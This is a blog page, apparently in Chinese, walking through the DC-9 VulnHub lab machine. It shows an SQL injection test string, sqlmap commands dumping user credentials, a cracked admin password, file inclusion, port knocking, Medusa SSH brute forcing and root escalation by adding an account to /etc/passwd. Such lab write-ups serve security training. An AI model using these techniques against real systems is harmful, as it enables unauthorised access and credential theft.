@@ -1,0 +1,246 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>DC-9 VulnHub Walkthrough | 2867a0's blog</title><meta name="keywords" content="DC Series"><meta name="author" content="2867a0"><meta name="copyright" content="2867a0"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="DC~9 WalkThrough          [TOC]  信息收集IP地址扫描目标IP地址，为10.0.0.4  端口扫描使用nmap扫描目标端口情况，使用-sS选项建立tcp 2次握手，发现目标22端口被过滤，80端口则处于开放状态  漏洞探测search.php页面SQL注入访问80端口，发现search页面，测试注入，测试语句为： 1&amp;#x27; or &amp;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DC-9 VulnHub Walkthrough">
+<meta property="og:url" content="http://2867a0.github.io/dc/dc9/index.html">
+<meta property="og:site_name" content="2867a0&#39;s blog">
+<meta property="og:description" content="DC~9 WalkThrough          [TOC]  信息收集IP地址扫描目标IP地址，为10.0.0.4  端口扫描使用nmap扫描目标端口情况，使用-sS选项建立tcp 2次握手，发现目标22端口被过滤，80端口则处于开放状态  漏洞探测search.php页面SQL注入访问80端口，发现search页面，测试注入，测试语句为： 1&amp;#x27; or &amp;">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://2867a0.github.io/img/default_cover.jpg">
+<meta property="article:published_time" content="2020-07-22T00:35:13.000Z">
+<meta property="article:modified_time" content="2020-07-22T00:39:26.000Z">
+<meta property="article:author" content="2867a0">
+<meta property="article:tag" content="DC Series">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://2867a0.github.io/img/default_cover.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://2867a0.github.io/dc/dc9/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: true,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'mediumZoom',
+  Snackbar: {"chs_to_cht":"Traditional Chinese Activated Manually","cht_to_chs":"Simplified Chinese Activated Manually","day_to_night":"Dark Mode Activated Manually","night_to_day":"Light Mode Activated Manually","bgLight":"#49b1f5","bgDark":"#121212","position":"bottom-left"},
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+};
+
+var saveToLocal = {
+  set: function setWithExpiry(key, value, ttl) {
+    const now = new Date()
+    const expiryDay = ttl * 86400000
+    const item = {
+      value: value,
+      expiry: now.getTime() + expiryDay,
+    }
+    localStorage.setItem(key, JSON.stringify(item))
+  },
+
+  get: function getWithExpiry(key) {
+    const itemStr = localStorage.getItem(key)
+
+    if (!itemStr) {
+      return undefined
+    }
+    const item = JSON.parse(itemStr)
+    const now = new Date()
+
+    if (now.getTime() > item.expiry) {
+      localStorage.removeItem(key)
+      return undefined
+    }
+    return item.value
+  }
+}
+
+// https://stackoverflow.com/questions/16839698/jquery-getscript-alternative-in-native-javascript
+const getScript = url => new Promise((resolve, reject) => {
+  const script = document.createElement('script')
+  script.src = url
+  script.async = true
+  script.onerror = reject
+  script.onload = script.onreadystatechange = function() {
+    const loadState = this.readyState
+    if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+    script.onload = script.onreadystatechange = null
+    resolve()
+  }
+  document.head.appendChild(script)
+})</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2020-07-22 08:39:26'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(function () {  window.activateDarkMode = function () {
+    document.documentElement.setAttribute('data-theme', 'dark')
+    if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+    }
+  }
+  window.activateLightMode = function () {
+    document.documentElement.setAttribute('data-theme', 'light')
+   if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+    }
+  }
+  const autoChangeMode = 'false'
+  const t = saveToLocal.get('theme')
+  if (autoChangeMode === '1') {
+    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+    if (t === undefined) {
+      if (isLightMode) activateLightMode()
+      else if (isDarkMode) activateDarkMode()
+      else if (isNotSpecified || hasNoSupport) {
+        const now = new Date()
+        const hour = now.getHours()
+        const isNight = hour <= 6 || hour >= 18
+        isNight ? activateDarkMode() : activateLightMode()
+      }
+      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+        if (saveToLocal.get('theme') === undefined) {
+          e.matches ? activateDarkMode() : activateLightMode()
+        }
+      })
+    } else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else if (autoChangeMode === '2') {
+    const now = new Date()
+    const hour = now.getHours()
+    const isNight = hour <= 6 || hour >= 18
+    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+    else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else {
+    if (t === 'dark') activateDarkMode()
+    else if (t === 'light') activateLightMode()
+  }const asideStatus = saveToLocal.get('aside-status')
+if (asideStatus !== undefined) {
+   if (asideStatus === 'hide') {
+     document.documentElement.classList.add('hide-aside')
+   } else {
+     document.documentElement.classList.remove('hide-aside')
+   }
+}const fontSizeVal = saveToLocal.get('global-font-size')
+if (fontSizeVal !== undefined) {
+  document.documentElement.style.setProperty('--global-font-size', fontSizeVal + 'px')
+}})()</script><meta name="generator" content="Hexo 5.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">18</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">8</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">5</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 档案</span></a></div><div class="menus_item"><a class="site-page" href="/about/me.html"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/default_cover.jpg)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">2867a0's blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 档案</span></a></div><div class="menus_item"><a class="site-page" href="/about/me.html"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">DC-9 VulnHub Walkthrough</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2020-07-22T00:35:13.000Z" title="Created 2020-07-22 08:35:13">2020-07-22</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2020-07-22T00:39:26.000Z" title="Updated 2020-07-22 08:39:26">2020-07-22</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/VulnHub/">VulnHub</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><div align="center">
+    <h2>
+        DC~9 WalkThrough
+    </h2>
+</div>
+
+<p><img src="https://s1.ax1x.com/2020/06/06/tcMTkq.jpg" alt="tcMTkq.jpg"></p>
+<hr>
+<p>[TOC]</p>
+<hr>
+<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="IP地址"><a href="#IP地址" class="headerlink" title="IP地址"></a>IP地址</h4><p>扫描目标IP地址，为10.0.0.4</p>
+<p><img src="https://s1.ax1x.com/2020/06/06/tcKmKH.jpg" alt="tcKmKH.jpg"></p>
+<h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><p>使用nmap扫描目标端口情况，使用-sS选项建立tcp 2次握手，发现目标22端口被过滤，80端口则处于开放状态</p>
+<p><img src="https://s1.ax1x.com/2020/06/06/tcMykt.jpg" alt="tcMykt.jpg"></p>
+<h3 id="漏洞探测"><a href="#漏洞探测" class="headerlink" title="漏洞探测"></a>漏洞探测</h3><h4 id="search-php页面SQL注入"><a href="#search-php页面SQL注入" class="headerlink" title="search.php页面SQL注入"></a>search.php页面SQL注入</h4><p>访问80端口，发现search页面，测试注入，测试语句为：</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">1<span class="string">&#x27; or &#x27;</span>aoe<span class="string">&#x27; = &#x27;</span>aoe</span><br></pre></td></tr></table></figure>
+<p>从返回的结果中得知目标存在SQL注入漏洞</p>
+<p><img src="https://s1.ax1x.com/2020/06/06/tcQ3jg.jpg" alt="tcQ3jg.jpg"></p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="数据库Staff"><a href="#数据库Staff" class="headerlink" title="数据库Staff"></a>数据库Staff</h4><p>使用sqlmap跑出数据库内容，先获取一个数据包</p>
+<p><img src="https://s1.ax1x.com/2020/06/06/tcQbVA.jpg" alt="tcQbVA.jpg"></p>
+<p>使用sqlmap进行漏洞利用，查询当前使用的数据库</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sqlmap -r <span class="string">&quot;dc9pcap.txt&quot;</span> -p <span class="string">&quot;search&quot;</span> --current-db</span><br></pre></td></tr></table></figure>
+<p><img src="https://s1.ax1x.com/2020/06/06/tclV2T.jpg" alt="tclV2T.jpg"></p>
+<p>查询数据库中的数据，数据库中有两张表:StaffDetails、Users</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sqlmap -r <span class="string">&quot;dc9pcap.txt&quot;</span> -p <span class="string">&quot;search&quot;</span> --dbms <span class="string">&quot;mysql&quot;</span> -D <span class="string">&quot;Staff&quot;</span> --tables</span><br></pre></td></tr></table></figure>
+<p><img src="https://s1.ax1x.com/2020/06/06/tcl2LQ.jpg" alt="tcl2LQ.jpg"></p>
+<p>表Users中的数据，发现admin的hash值</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sqlmap -r <span class="string">&quot;dc9pcap.txt&quot;</span> -p <span class="string">&quot;search&quot;</span> --dbms <span class="string">&quot;mysql&quot;</span> -D <span class="string">&quot;Staff&quot;</span> -T <span class="string">&quot;Users&quot;</span> --columns</span><br></pre></td></tr></table></figure>
+<p><img src="https://s1.ax1x.com/2020/06/06/tclUqH.jpg" alt="tclUqH.jpg"></p>
+<h4 id="数据库users"><a href="#数据库users" class="headerlink" title="数据库users"></a>数据库users</h4><p>查询全部数据库，发现还有一个数据库users</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sqlmap -r <span class="string">&quot;dc9pcap.txt&quot;</span> -p <span class="string">&quot;search&quot;</span> --dbms <span class="string">&quot;mysql&quot;</span> --dbs</span><br></pre></td></tr></table></figure>
+<p><img src="https://s1.ax1x.com/2020/06/06/tc1keH.jpg" alt="tc1keH.jpg"></p>
+<p>数据库users中的内容</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sqlmap -r <span class="string">&quot;dc9pcap.txt&quot;</span> -p <span class="string">&quot;search&quot;</span> --threads 10 --dbms <span class="string">&quot;mysql&quot;</span> -D <span class="string">&quot;users&quot;</span> -T <span class="string">&quot;UserDetails&quot;</span> -C <span class="string">&quot;username,password&quot;</span> --dump</span><br></pre></td></tr></table></figure>
+<p><img src="https://s1.ax1x.com/2020/06/06/tc1Bm4.jpg" alt="tc1Bm4.jpg"></p>
+<h4 id="破解admin-hash值"><a href="#破解admin-hash值" class="headerlink" title="破解admin hash值"></a>破解admin hash值</h4><p>将admin的hash值甩到在线网站破解（这里使用john破解太费事），获得密码为：<strong>transorbital1</strong></p>
+<h4 id="登录后台"><a href="#登录后台" class="headerlink" title="登录后台"></a>登录后台</h4><p>使用账号密码登录后台，登录后在manage.php尝试文件包含</p>
+<p><img src="https://s1.ax1x.com/2020/06/07/tg1cGt.jpg" alt="tg1cGt.jpg"></p>
+<p>查看配置文件/etc/knockd.conf文件，得知开启ssh的3个端口</p>
+<p><img src="https://s1.ax1x.com/2020/06/07/tg1WM8.jpg" alt="tg1WM8.jpg"></p>
+<h4 id="SSH端口"><a href="#SSH端口" class="headerlink" title="SSH端口"></a>SSH端口</h4><p>使用knockd进行敲门</p>
+<p><img src="https://s1.ax1x.com/2020/06/07/tg1Iaj.jpg" alt="tg1Iaj.jpg"></p>
+<p>使用users数据库中的username，password进行暴力破解</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">medusa -h 10.0.0.4 -M ssh -U UserDetails.csv -P UserDetails.csv -e s -t 20</span><br></pre></td></tr></table></figure>
+<p><img src="https://s1.ax1x.com/2020/06/09/t432c9.jpg" alt="t432c9.jpg"></p>
+<h3 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h3><p>使用ssh登录janitor账户，发现新的密码文件</p>
+<p><img src="https://s1.ax1x.com/2020/06/09/t48mNT.jpg" alt="t48mNT.jpg"></p>
+<p>使用获得的密码文件再次对数据库中获得的用户进行爆破，获得fredf账户密码“B4-Tru3-001”</p>
+<p><img src="https://s1.ax1x.com/2020/06/09/t48W8g.jpg" alt="t48W8g.jpg"></p>
+<p>登录fredf账户，使用命令“sudo -l”发现提示</p>
+<p><img src="https://s1.ax1x.com/2020/06/09/t48b5T.jpg" alt="t48b5T.jpg"></p>
+<p>同时在/opt/devstuff目录下发现test.py脚本源代码</p>
+<p><img src="https://s1.ax1x.com/2020/06/09/t4Gad0.jpg" alt="t4Gad0.jpg"></p>
+<blockquote>
+<p>接下来的思路是使用openssl生成加密后的密码，通过test脚本向/etc/passwd写入一个root权限的账号，切换至该账号从而获得root权限</p>
+</blockquote>
+<p>使用openssl加密123，获得加密后的密码</p>
+<p><img src="https://s1.ax1x.com/2020/06/09/t4YSN6.jpg" alt="t4YSN6.jpg"></p>
+<p>按照/etc/passwd中的用户格式生成自己的账号</p>
+<p><a href="https://imgchr.com/i/t4Yn4f"><img src="https://s1.ax1x.com/2020/06/09/t4Yn4f.jpg" alt="t4Yn4f.jpg"></a></p>
+<p>使用test脚本写入到/etc/passwd</p>
+<p><img src="https://s1.ax1x.com/2020/06/09/t4tTlF.jpg" alt="t4tTlF.jpg"></p>
+<p>写入成功，切换到aoe账号</p>
+<p><img src="https://s1.ax1x.com/2020/06/09/t4NSSO.jpg" alt="t4NSSO.jpg"></p>
+<p>查看最后的flag</p>
+<p><img src="https://s1.ax1x.com/2020/06/09/t4Nimd.jpg" alt="t4Nimd.jpg"></p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><h4 id="knock敲门"><a href="#knock敲门" class="headerlink" title="knock敲门"></a>knock敲门</h4><blockquote>
+<p>knock配置文件/etc/knockd.conf</p>
+<p>使用knock敲门打开ssh端口</p>
+</blockquote>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo knock &lt;IP&gt; &lt;Port1&gt; &lt;Port2&gt; &lt;Port3&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="openssl生成账户密码hash"><a href="#openssl生成账户密码hash" class="headerlink" title="openssl生成账户密码hash"></a>openssl生成账户密码hash</h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">openssl passwd -1 -salt &lt;user&gt; &lt;pass&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="Medusa暴力破解ssh服务账号密码并只打印成功的密码"><a href="#Medusa暴力破解ssh服务账号密码并只打印成功的密码" class="headerlink" title="Medusa暴力破解ssh服务账号密码并只打印成功的密码"></a>Medusa暴力破解ssh服务账号密码并只打印成功的密码</h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">medusa -h &lt;ip&gt; -M ssh -U &lt;user.txt&gt; -P &lt;pass.txt&gt; -e s -t 10 2&gt;/dev/null | grep SUCCESS</span><br></pre></td></tr></table></figure>
+</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/DC-Series/">DC Series</a></div><div class="post_share"><div class="social-share" data-image="/img/default_cover.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/dc/five86-1/"><img class="prev-cover" src="/img/default_cover.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">Five86-1  VulnHub Walkthrough</div></div></a></div><div class="next-post pull-right"><a href="/dc/dc8/"><img class="next-cover" src="/img/default_cover.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">DC-8 VulnHub Walkthrough</div></div></a></div></nav></div><div class="aside_content" id="aside_content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="card-content"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">
+        DC~9 WalkThrough
+    </span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.1.</span> <span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#IP%E5%9C%B0%E5%9D%80"><span class="toc-number">1.1.1.</span> <span class="toc-text">IP地址</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.1.2.</span> <span class="toc-text">端口扫描</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%8E%A2%E6%B5%8B"><span class="toc-number">1.2.</span> <span class="toc-text">漏洞探测</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#search-php%E9%A1%B5%E9%9D%A2SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">1.2.1.</span> <span class="toc-text">search.php页面SQL注入</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.3.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93Staff"><span class="toc-number">1.3.1.</span> <span class="toc-text">数据库Staff</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93users"><span class="toc-number">1.3.2.</span> <span class="toc-text">数据库users</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A0%B4%E8%A7%A3admin-hash%E5%80%BC"><span class="toc-number">1.3.3.</span> <span class="toc-text">破解admin hash值</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%99%BB%E5%BD%95%E5%90%8E%E5%8F%B0"><span class="toc-number">1.3.4.</span> <span class="toc-text">登录后台</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SSH%E7%AB%AF%E5%8F%A3"><span class="toc-number">1.3.5.</span> <span class="toc-text">SSH端口</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%8E%E6%B8%97%E9%80%8F"><span class="toc-number">1.4.</span> <span class="toc-text">后渗透</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.5.</span> <span class="toc-text">总结</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#knock%E6%95%B2%E9%97%A8"><span class="toc-number">1.5.1.</span> <span class="toc-text">knock敲门</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#openssl%E7%94%9F%E6%88%90%E8%B4%A6%E6%88%B7%E5%AF%86%E7%A0%81hash"><span class="toc-number">1.5.2.</span> <span class="toc-text">openssl生成账户密码hash</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Medusa%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3ssh%E6%9C%8D%E5%8A%A1%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E5%B9%B6%E5%8F%AA%E6%89%93%E5%8D%B0%E6%88%90%E5%8A%9F%E7%9A%84%E5%AF%86%E7%A0%81"><span class="toc-number">1.5.3.</span> <span class="toc-text">Medusa暴力破解ssh服务账号密码并只打印成功的密码</span></a></li></ol></li></ol></li></ol></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By 2867a0</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="font-plus" type="button" title="Increase font size"><i class="fas fa-plus"></i></button><button id="font-minus" type="button" title="Decrease font size"><i class="fas fa-minus"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom/dist/medium-zoom.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><div class="js-pjax"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></div></body></html>
